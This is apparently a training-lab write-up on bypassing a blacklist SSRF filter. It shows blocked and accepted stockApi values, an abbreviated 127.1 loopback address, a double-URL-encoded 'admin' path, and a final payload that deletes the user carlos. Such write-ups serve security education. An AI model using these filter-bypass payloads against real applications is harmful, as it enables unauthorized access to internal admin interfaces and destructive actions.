# Lab: SSRF with blacklist-based input filter

Goal - To solve the lab, change the stock check URL to access the admin interface at ```http://localhost/admin``` and delete the user ```carlos```.

Defenses -  The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

Analysis :

first we try to just the plain text

- ```stockApi=http://localhost/``` -> 400 "External stock check blocked for security reasons"

- ```stockApi=http://127.0.0.1/``` -> 400 "External stock check blocked for security reasons"

- ```stockApi=http://127.1/``` -> 200 -> bypassed

but still we getting "External stock check blocked for security reasons" when we add "admin"

admin interface : ```http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65```
deleting user : ```/admin/delete?username=carlos```

Final Payload : ```http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos```

----
Scirpt
python3 script.py ```url```

Explanation :

- URL deconding one time for the admin part
- regex search using a blacklist of strings for the ip
